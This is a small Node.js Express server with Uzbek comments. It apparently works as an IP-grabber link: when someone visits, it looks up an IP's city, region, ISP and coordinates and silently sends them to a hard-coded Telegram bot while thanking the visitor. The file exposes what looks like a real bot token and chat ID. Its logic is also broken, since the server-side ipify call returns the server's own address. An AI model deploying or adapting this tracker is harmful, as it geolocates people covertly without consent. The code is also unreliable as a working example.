const express = require('express');
const axios = require('axios');
const app = express();

// Telegram bot token va chat ID
const telegramToken = '7591835594:AAGafTZbs6U_vWadufkThR5gAcscaoUKFwQ';  // Bot tokenini kiriting
const chatId = '1271713912';  // Siz yuborishni xohlagan chat ID yoki botning username (masalan: '@username')

// IP manzilini olish
app.get('/', async (req, res) => {
    try {
        // ipify.org API orqali IP manzilini olish
        const response = await axios.get('https://api.ipify.org?format=json');
        const ip = response.data.ip;  // IP manzili
        console.log(`Foydalanuvchining IP manzili: ${ip}`);

        // IP manziliga asoslangan qo'shimcha ma'lumotlarni olish
        const geoResponse = await axios.get(`http://ip-api.com/json/${ip}`);
        const { city, regionName, country, isp, lat, lon } = geoResponse.data;

        // Natijani foydalanuvchiga yuborish
        const message = `
            IP Manzil: ${ip}
            Shahar: ${city}
            Mintaqa: ${regionName}
            Mamlakat: ${country}
            ISP: ${isp}
            Kenglik: ${lat}
            Uzunlik: ${lon}
            
        `;
        
        // Telegramga yuborish
        await axios.post(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
            chat_id: chatId,
            text: message
        });

        // Foydalanuvchiga javob qaytarish
        res.json({
            message: 'Raxmat!'
        });
    } catch (error) {
        console.error('Xato:', error);
        res.status(500).json({ message: 'Ma‘lumot olishda xato yuz berdi' });
    }
});

// Serverni ishga tushirish
const port = process.env.PORT || 3000;  // Hostingda portni avtomatik oladi
app.listen(port, () => {
    console.log(`Server http://localhost:${port} da ishlamoqda...`);
});
